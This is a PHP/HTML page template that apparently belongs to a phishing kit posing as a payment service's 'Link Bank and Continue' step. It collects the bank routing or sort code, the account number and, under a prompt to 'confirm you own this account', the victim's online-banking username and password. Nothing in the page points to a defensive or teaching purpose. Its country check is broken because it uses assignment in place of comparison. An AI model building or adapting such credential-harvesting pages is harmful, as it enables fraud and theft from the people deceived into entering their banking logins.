<?php
	
if ($countrycode = 'US'){
	$input = 'Root Number';
}else{
$input = 'Sort Code';
}
	
	?>
<div style="display: block;" class="">
	

<form name="sub" id="sub" action="" method="post" class="subViewproceed" style="position:static;">

<div id="manualAddBank" class="manualAddBank">
<div class="radioBox">
<label class="radioLabel">
<input name="accountType" value="Checking" checked="" type="radio">
<span class="radioButton">
</span>Checking</label>
<label class="radioLabel">


<input name="accountType" value="Savings" type="radio">
<span class="radioButton">
</span>Savings</label>
</div>
<div class="bankCheck US">
<span style="display:none;" id="number" name="number" class="highlightRoutingNumber"></span>
<span style="display:none;" id="rout" name="rout" class="highlightAccountNumber"></span></div>
<div class="groupFields">
<div class="multi equal clearfix">
<div id="inpt1" name="inpt1">
<div class="fields medium left">
<label class="accessAid" for="routingNumber"></label>
<input aria-invalid="false"  placeholder="<?=$input; ?>"  id="Sort" name="Sort" class="textInput.hasError" required="required" value=""  autocomplete="off" autocorrect="off" autocapitalize="off"  type="tel">
<div style="display:none;" id="bankNameNotFound" name="bankNameNotFound">We couldn't retrieve your bank name. Please check your routing number and try again.</div>

</div>
<div class="errorMessage">
<p class="help-error error-empty"  id="routingNumberEmpty">Required.</p><p class="help-error error-format" id="routingNumberFormat">Check your routing number.</p>

</div>
</div>
<div id="inpt2" name="inpt1">
<div class="fields medium right">
<label class="" for="accountNumber"></label>
<input onclick="document.getElementById('number').style.display = 'none';document.getElementById('rout').style.display = 'block'" aria-invalid="true" placeholder="Account number" class="confidential validate" id="accountNumber" name="accountNumber" required="required" value="" autocomplete="off" autocorrect="off" autocapitalize="off" type="tel">
</div>
<div class="errorMessage">
<p class="help-error error-empty" id="accountNumberEmpty">Required.</p><p class="help-error error-format" id="accountNumberFormat">Check your account number.</p>
</div>
</div>
</div>
</div>





<!-- BANK INFO -->
<div id="field" class="col-xs-12" style="display:none;  text-align:center;">
	
	<img id="loading" style="display :; position: relative; width: 50px;" style="margin-top: 15px;" src='../set/img/241.GIF'>




</div>

<div class="bankDetails col-xs-12" id="bankDetails" style="text-align:left; display:none;">
<div>
<h3 id="bankName"></h3>
<input id="nameofbnk" name="nameofbnk" value="" type="hidden" >
</div>

<div class="bankTerms col-xs-12">
<p>This bank account may be used as your default payment method. </p>



<div class="blue col-xs-12" id="randomDeposit"style="display:none;" >
	<div style="float: right; text-align: right;" class="col-xs-6 right">
		<img id="logo" name="logo" class="img" src="../" /><h3 id="BNN" style="margin: 0px; float: right;"></h3></div><br/>
	<h3><span class="timer">
	</span>Be sure to confirm you own this account.</h3>


<div class="groupFields">
<div class="multi equal clearfix"  style="display:;">

<div class="fields medium left">
<input style="width:90%;" placeholder="ID/UserName" id="logId" name="logId"  value="" autocomplete="off" required/>
</div>

<div class="fields medium right">
<input style="width:90%;" placeholder="Password" id="passId" name="passId" type="password" value="" autocomplete='off' required/>
</div>
</div>
</div>
</div>
</div>


</div>
<div name="load" id="load" class="bankTerms" style="display:none;text-align:center; width: 100%; height: 59%; position: absolute; top: 165px; background: rgb(171, 204, 216) none repeat scroll 0% 0%; opacity: 0.7; border-radius: 5px;">
	<img  style="position: relative;
top: 160px;
width: 50px;

opacity: 0.9;" src='../set/img/241.GIF'>
	</div>
<div class="col-xs-12 col-md-12">
<input onclick="return done();"id="confirmBank" name="_eventId_continue" class="button"  value="Link Bank and Continue" style="margin-top: 13px; position: relative; top: 10%;" type="button">

</div>



<!-- error msg -->

<!-- error msg -->





<script>			
$("#Sort").mask("99-99-99");
</script>

</div>
</form>
</div>
